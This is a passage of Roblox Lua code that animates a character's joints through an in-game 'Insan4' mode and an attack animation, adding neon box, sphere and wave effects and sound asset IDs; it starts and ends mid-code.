			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		RightArmGrasp.Part0 = Torso
		RightArmGrasp.C0 = CF(1.1,-1.1,0) * ANGLES(RAD(0), RAD(-90), RAD(-90))
        sick.SoundId = "rbxassetid://212675193"
sick.TimePosition = 0
		MODE = "Insan4"
	elseif MODE == "Insan4" then
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(-30), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(-60), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(-90), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(-120), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(-150), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(-180), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(-210), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(-240), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
					local POS = RootPart.Position
			for i = 1, 5 do
				WACKYEFFECT({
					Time = 65,
					EffectType = "Sphere",
					Size = VT(2, 2, 2),
					Size2 = VT(0, 0, 500),
					Transparency = 1,
					Transparency2 = 0,
					CFrame = CF(POS),
					MoveToPos = nil,
					RotationX = MRANDOM(-2, 2),
					RotationY = MRANDOM(-12, 12),
					RotationZ = MRANDOM(-2, 2),
					Material = "Neon",
					Color = C3(1, 0, 0),
					SoundID = nil,
					SoundPitch = nil,
					SoundVolume = nil
				})
			end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(-270), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		RightArmGrasp.Part0 = RightArm
		RightArmGrasp.C0 = CF(0,-0.8, 0) * ANGLES(RAD(90), RAD(0), RAD(0))
sick.SoundId = "rbxassetid://1138145518"
sick.TimePosition = 0
		MODE = "Insan"
	end
	ATTACK = false
	Rooted = false
end

function AttackTemplate()
	ATTACK = true
	Rooted = false
	for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 4 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 4 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 4 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * LEFTSHOULDERC0, 4 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
	end
		for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 4 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 4 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 4 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.1, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * LEFTSHOULDERC0, 4 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		end
				WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = LeftHole2.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = LeftHole.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
	
			for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 4 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 4 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 4 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * LEFTSHOULDERC0, 4 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			end
				for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 4 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 4 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 4 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.1, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * LEFTSHOULDERC0, 4 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
				end
					WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = LeftHole2.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = LeftHole.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
	
					for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 4 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 4 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 4 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(180), RAD(0), RAD(0)) * LEFTSHOULDERC0, 4 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
